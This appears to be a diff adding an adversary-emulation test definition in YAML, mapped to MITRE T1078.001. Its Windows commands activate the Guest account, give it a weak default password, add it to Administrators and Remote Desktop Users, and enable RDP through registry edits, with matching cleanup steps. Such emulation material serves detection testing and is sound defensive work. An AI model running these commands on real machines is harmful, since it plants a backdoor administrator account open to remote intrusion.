@@ -1,0 +1,54 @@
+api_version: "2.0"
+name: Enable Guest account with RDP capability and admin privileges
+description: |
+    After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
+    and desktop will allow multiple RDP connections.
+args:
+    - name: guest_user
+      type: string
+      default: guest
+    - name: guest_password
+      type: string
+      default: Password123!
+    - name: local_admin_group
+      type: string
+      default: Administrators
+    - name: remote_desktop_users_group_name
+      type: string
+      default: Remote Desktop Users
+    - name: remove_rdp_access_during_cleanup
+      type: integer
+      default: "0"
+uuid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+        - 'TA0001: Initial Access'
+    techniques:
+        - 'T1078: Valid Accounts'
+    subtechniques:
+        - 'T1078.001: Default Accounts'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: enable-guest-account-with-rdp-capability-and-admin-privileges
+      inline: |-
+        net user {{.Args.guest_user}} /active:yes
+        net user {{.Args.guest_user}} {{.Args.guest_password}}
+        net localgroup {{.Args.local_admin_group}} {{.Args.guest_user}} /add
+        net localgroup "{{.Args.remote_desktop_users_group_name}}" {{.Args.guest_user}} /add
+        reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+        reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+      executor: command_prompt
+      cleanup:
+        inline: |-
+            net user {{.Args.guest_user}} /active:no >nul 2>&1
+            net localgroup {{.Args.local_admin_group}} {{.Args.guest_user}} /delete >nul 2>&1
+            net localgroup "{{.Args.remote_desktop_users_group_name}}" {{.Args.guest_user}} /delete >nul 2>&1
+            if {{.Args.remove_rdp_access_during_cleanup}} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+            if {{.Args.remove_rdp_access_during_cleanup}} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+            if {{.Args.remove_rdp_access_during_cleanup}} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
+        executor: command_prompt
